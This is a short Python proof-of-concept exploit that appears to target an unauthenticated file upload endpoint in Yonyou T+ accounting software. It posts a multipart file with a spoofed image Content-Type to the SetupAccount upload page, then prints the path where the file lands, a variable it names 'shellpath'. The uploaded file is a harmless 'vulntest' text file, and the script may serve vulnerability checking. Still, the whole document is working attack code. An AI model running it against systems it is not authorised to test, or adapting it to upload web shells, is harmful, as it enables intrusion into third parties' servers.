#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import re
import sys
import webbrowser
import  time


def upload(site):
    path = "/tplus/SM/SetupAccount/Upload.aspx?preload=1"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarysHT4cEvOAWALSZEv',
        'Origin': 'null',
        'Upgrade-Insecure-Requests': '1'

    }
    url = site + path
    data = '------WebKitFormBoundarysHT4cEvOAWALSZEv\n'\
        'Content-Disposition: form-data; name="File1"; filename="vulntest.txt"\n'\
        'Content-Type: image/jpeg\n'\
        '\n'\
        'vulntest\n'\
        '------WebKitFormBoundarysHT4cEvOAWALSZEv--'
    req = requests.post(url, headers=headers, data=data,verify=False, timeout=20)
    shellpath = site + "/tplus/SM/SetupAccount/images/vulntest.txt"
    print('[+] 上传成功！ 请查看响应包内容！路径：', shellpath)

if __name__=="__main__":
    upload(sys.argv[1])
    
